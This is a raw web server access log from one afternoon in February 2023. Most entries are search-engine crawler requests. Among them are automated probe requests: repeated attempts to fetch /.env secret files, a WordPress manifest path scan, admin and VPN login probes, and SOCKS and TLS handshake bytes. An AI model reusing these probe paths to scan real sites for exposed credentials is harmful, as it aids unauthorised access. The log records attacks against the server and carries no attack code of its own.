2.57.122.192 - - [11/Feb/2023:16:55:48 +0000] "GET /.env HTTP/1.1" 404 6616 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
40.77.167.165 - - [11/Feb/2023:17:03:04 +0000] "GET /download/fIHIouJ8w18 HTTP/1.1" 404 6622 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [11/Feb/2023:17:14:12 +0000] "GET / HTTP/1.1" 200 18574 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
65.108.64.210 - - [11/Feb/2023:17:27:17 +0000] "GET /robots.txt HTTP/1.1" 200 24 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.64.210 - - [11/Feb/2023:17:27:18 +0000] "GET /feed/-fF35gtBkuM/%E0%B0%86%E0%B0%B0+%E0%B0%AD%E0%B0%AE%E0%B0%AF+%E0%B0%A6+restoration+song+by+bro+anil+kumar+at+jangareddygudem+crusade+2017 HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.64.210 - - [11/Feb/2023:17:27:20 +0000] "GET /feed/A4WckOkyrj4/ateez+%EC%97%90%EC%9D%B4%ED%8B%B0%EC%A6%88+2019+mama+performance+practice HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.64.210 - - [11/Feb/2023:17:27:22 +0000] "GET /feed/Bd8-YRl5UzI/%E9%99%88%E5%A3%B9%E5%8D%83+%E9%A3%9E+%E9%A3%9E+%E9%A3%9E+%E5%8D%B8%E4%B8%8B%E9%98%B2%E5%A4%87%E6%93%A6%E6%8E%89%E7%9C%BC%E6%B3%AA%E5%8A%AA%E5%8A%9B%E8%BF%BD%E9%9A%8F+%E5%8A%A8%E6%80%81%E6%AD%8C%E8%AF%8D HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.64.210 - - [11/Feb/2023:17:27:23 +0000] "GET /feed/FIInyEWWW-s/ateez+%EC%97%90%EC%9D%B4%ED%8B%B0%EC%A6%88+wave+official+mv HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
185.180.143.76 - - [11/Feb/2023:17:39:23 +0000] "GET / HTTP/1.1" 200 18590 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
52.167.144.91 - - [11/Feb/2023:17:42:34 +0000] "GET /download/c6rP-YP4c5I HTTP/1.1" 404 6616 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
66.249.73.232 - - [11/Feb/2023:17:48:56 +0000] "GET /download/BDYI482ShZQ HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.79.29.48 - - [11/Feb/2023:17:49:12 +0000] "POST / HTTP/1.1" 405 885016 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/Feb/2023:17:49:12 +0000] "GET /.env HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.246.220.98 - - [11/Feb/2023:17:57:57 +0000] "GET / HTTP/1.1" 200 18574 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [11/Feb/2023:17:59:26 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
157.230.99.148 - - [11/Feb/2023:18:01:18 +0000] "GET http://test.getproxylist.com/ HTTP/1.1" 200 18590 "foobartest.com" "FooBarTest"
157.230.99.148 - - [11/Feb/2023:18:01:18 +0000] "\x05\x02\x00\x01" 400 157 "-" "-"
157.230.99.148 - - [11/Feb/2023:18:01:18 +0000] "\x05\x02\x00\x01" 400 157 "-" "-"
157.230.99.148 - - [11/Feb/2023:18:01:18 +0000] "\x04\x01\x00P\x00\x00\x00\x01\x00test.getproxylist.com\x00" 400 157 "-" "-"
157.230.99.148 - - [11/Feb/2023:18:01:18 +0000] "\x04\x01\x00PXc\xC3\x06\x00" 400 157 "-" "-"
66.249.73.234 - - [11/Feb/2023:18:13:22 +0000] "GET /in/alamat-pt-gemala-sarana-upaya/mamaktuwa HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
52.167.144.91 - - [11/Feb/2023:18:22:28 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.88 - - [11/Feb/2023:18:27:08 +0000] "GET /sitemap.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
66.249.73.234 - - [11/Feb/2023:18:42:30 +0000] "GET /in/download-lagu-ramadhan-tiba-dangdut/mamaktuwa HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
193.32.162.159 - - [11/Feb/2023:18:49:50 +0000] "GET / HTTP/1.1" 200 18574 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
52.167.144.88 - - [11/Feb/2023:18:50:49 +0000] "GET /download/DfNNl4QP9uY HTTP/1.1" 404 6616 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.165 - - [11/Feb/2023:18:51:44 +0000] "GET /in/iwan-fals-wakil-rakyat-lirik-dan-chord/mamaktuwa HTTP/1.1" 404 6616 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
172.104.11.46 - - [11/Feb/2023:18:52:01 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03P\xA1\xF3\x5C\xAA\xF7%<\xBFFp\xEC\xC7y%8\xAE7,7}V\x13\x91\x1D\x92\x03\x80_\x06\xAE\xDF\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
40.77.167.165 - - [11/Feb/2023:18:55:27 +0000] "GET /in/tiesto-red-light-mp3/mamaktuwa HTTP/1.1" 404 6622 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
3.10.139.249 - - [11/Feb/2023:18:55:48 +0000] "GET / HTTP/1.0" 200 18561 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
143.110.222.166 - - [11/Feb/2023:18:57:57 +0000] "GET / HTTP/1.1" 200 18574 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
3.10.139.249 - - [11/Feb/2023:18:59:14 +0000] "GET / HTTP/1.0" 200 18561 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.139.249 - - [11/Feb/2023:19:02:41 +0000] "GET / HTTP/1.0" 200 18561 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
66.249.65.51 - - [11/Feb/2023:19:22:15 +0000] "GET /robots.txt HTTP/1.1" 200 24 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.53 - - [11/Feb/2023:19:22:16 +0000] "GET /ads.txt HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
64.252.89.10 - - [11/Feb/2023:19:25:19 +0000] "GET /bangalore/places/places HTTP/1.1" 404 7057 "-" "Amazon CloudFront"
34.78.6.216 - - [11/Feb/2023:19:25:30 +0000] "GET / HTTP/1.1" 200 18589 "-" "python-requests/2.28.2"
208.90.142.104 - - [11/Feb/2023:19:32:43 +0000] "GET / HTTP/1.1" 200 18589 "-" "Hello World"
3.10.139.249 - - [11/Feb/2023:19:34:53 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03d\xB1\xF0\xF9\xE0\x9B\x14\xC6\x0B\x97'e\xAC\xA2-{6\xA4z\x12\xDA\x16\x93\xC2\x92\xB4G\x824" 400 157 "-" "-"
165.232.175.227 - - [11/Feb/2023:19:37:01 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:01 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:01 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:02 +0000] "GET / HTTP/1.1" 200 18590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:02 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:03 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:03 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:04 +0000] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:04 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:05 +0000] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:05 +0000] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:06 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
3.10.139.249 - - [11/Feb/2023:19:37:06 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03e\x17>\xFD\xA0o\xA4\x91~r\x1B\xADC\xC9\xEA\x7FK5\x03\xE2x\xA0\x83\x88\xE6!bc\xD9&3B\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
165.232.175.227 - - [11/Feb/2023:19:37:06 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:07 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:07 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:08 +0000] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:08 +0000] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:09 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:09 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:10 +0000] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
165.232.175.227 - - [11/Feb/2023:19:37:10 +0000] "" 400 0 "-" "-"
3.10.139.249 - - [11/Feb/2023:19:39:45 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB6\x09\xF6\xE5q\xAEuR\xBEH\x06\xEC\xE9\xF9\xEE\x05\xB2D_\x87\xDA\x5CG\x0E\x1D(\x07D\xF9\xC2j\xFC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
3.10.139.249 - - [11/Feb/2023:19:41:08 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03n\x14f\x7F\xE5\xAF\x7FF\xA0\xFB\xB6\xFD\x05epX\xE1\xAB\xA1eU\xBFc\x03\xF1_\xD6dw\x17\xEC\x5C\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
3.10.139.249 - - [11/Feb/2023:19:42:24 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1B\x0F\xC1Pmk\x1B\x1F\x97*\xC0\xC6\x80\xE6&\xBET\x0B\x15_\xE3\xE9\xC79\x1F\x00\x15\xE0\x14\x8B\x5C\xEE\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
3.10.139.249 - - [11/Feb/2023:19:45:08 +0000] "GET /favicon.ico HTTP/1.1" 200 0 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.139.249 - - [11/Feb/2023:19:46:22 +0000] "GET /manage/account/login HTTP/1.1" 404 6622 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.139.249 - - [11/Feb/2023:19:47:40 +0000] "GET /admin/index.html HTTP/1.1" 404 6622 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
66.249.73.230 - - [11/Feb/2023:19:48:16 +0000] "GET /download/FsZtR-WZEKU HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:48:25 +0000] "GET /download/FsZtR-WZEKU HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:48:35 +0000] "GET /download/d8pjIgNTrNM HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:48:44 +0000] "GET /download/d8pjIgNTrNM HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:48:54 +0000] "GET /download/rTOWWCBNw9Q HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:49:04 +0000] "GET /download/rTOWWCBNw9Q HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:49:13 +0000] "GET /download/lE0AERZ8-yU HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:49:33 +0000] "GET /download/lE0AERZ8-yU HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:49:52 +0000] "GET /download/WJUgpaGxjXU HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:50:11 +0000] "GET /download/WJUgpaGxjXU HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
3.10.139.249 - - [11/Feb/2023:19:50:20 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 6622 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
66.249.73.232 - - [11/Feb/2023:19:50:31 +0000] "GET /download/wdSX9lPFOeA HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.79.29.48 - - [11/Feb/2023:19:50:44 +0000] "POST / HTTP/1.1" 405 885023 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/Feb/2023:19:50:44 +0000] "GET /.env HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.73.230 - - [11/Feb/2023:19:50:50 +0000] "GET /download/-BvFFXqS9Ik HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:51:09 +0000] "GET /download/-BvFFXqS9Ik HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:51:28 +0000] "GET /download/Vm_VhBE1rHw HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
3.10.139.249 - - [11/Feb/2023:19:51:34 +0000] "GET / HTTP/1.1" 200 18589 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
66.249.73.230 - - [11/Feb/2023:19:51:48 +0000] "GET /download/XGshAo0F3YI HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:52:07 +0000] "GET /download/XGshAo0F3YI HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:52:26 +0000] "GET /download/xEy3f1FR_D4 HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.165 - - [11/Feb/2023:19:52:40 +0000] "GET /in/ladipoe-ft-buju-instrumental/mamaktuwa HTTP/1.1" 404 6622 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
66.249.73.230 - - [11/Feb/2023:19:52:46 +0000] "GET /download/xEy3f1FR_D4 HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:53:05 +0000] "GET /download/Q6HlYsDhJzc HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:53:24 +0000] "GET /download/myOIOHJuV0c HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:53:44 +0000] "GET /download/Q6HlYsDhJzc HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:54:03 +0000] "GET /download/PlZQHZWMOTE HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:54:22 +0000] "GET /download/PlZQHZWMOTE HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:54:42 +0000] "GET /download/zMGlhhjMRmo HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:55:01 +0000] "GET /download/zMGlhhjMRmo HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:55:20 +0000] "GET /download/LLkzptEvD5o HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:55:39 +0000] "GET /download/LLkzptEvD5o HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:55:59 +0000] "GET /download/qSgPwCOOyD0 HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:56:18 +0000] "GET /download/qSgPwCOOyD0 HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:56:37 +0000] "GET /download/nNnmI-REt6Y HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.95 - - [11/Feb/2023:19:56:57 +0000] "GET /download/nNnmI-REt6Y HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:57:16 +0000] "GET /download/FYLTxpGNjxg HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:57:35 +0000] "GET /download/FYLTxpGNjxg HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:57:55 +0000] "GET /download/v-AwnL8hAHs HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
